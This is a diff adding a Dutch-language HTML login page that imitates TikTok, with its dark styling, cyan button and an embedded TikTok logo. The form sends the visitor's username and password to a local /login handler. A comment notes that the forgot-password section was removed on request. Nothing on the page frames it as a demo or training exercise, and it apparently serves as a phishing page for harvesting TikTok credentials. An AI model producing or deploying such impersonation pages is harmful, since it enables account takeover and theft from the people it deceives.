@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Inloggen</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000; /* Zwarte achtergrond voor de pagina */
+            color: white;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #181818;
+            border-radius: 12px;
+            padding: 30px;
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            width: 120px; /* Pas de breedte van het logo aan naar wens */
+        }
+
+        h2 {
+            text-align: center;
+            font-size: 22px;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #333;
+            border-radius: 6px;
+            background-color: #333;
+            color: white;
+            font-size: 16px;
+        }
+
+        input[type="submit"] {
+            width: 100%;
+            padding: 12px;
+            background-color: #25f4f4;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #1bbdbd;
+        }
+
+        .forgot-password {
+            text-align: right;
+            font-size: 14px;
+            color: #888;
+        }
+
+        .forgot-password a {
+            color: #25f4f4;
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Voeg hier je Base64-afbeelding in -->
+        <div class="logo">
+            <img src="data:image/png;base64,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" alt="TikTok Logo">
+        </div>
+
+        <h2>Log in om door te gaan</h2>
+
+        <form action="/login" method="POST">
+            <input type="text" name="username" placeholder="Gebruikersnaam" required>
+            <input type="password" name="password" placeholder="Wachtwoord" required>
+            <input type="submit" value="Inloggen">
+        </form>
+
+        <div class="forgot-password">
+            <!-- Deze sectie is verwijderd zoals gevraagd -->
+        </div>
+    </div>
+
+</body>
+</html>
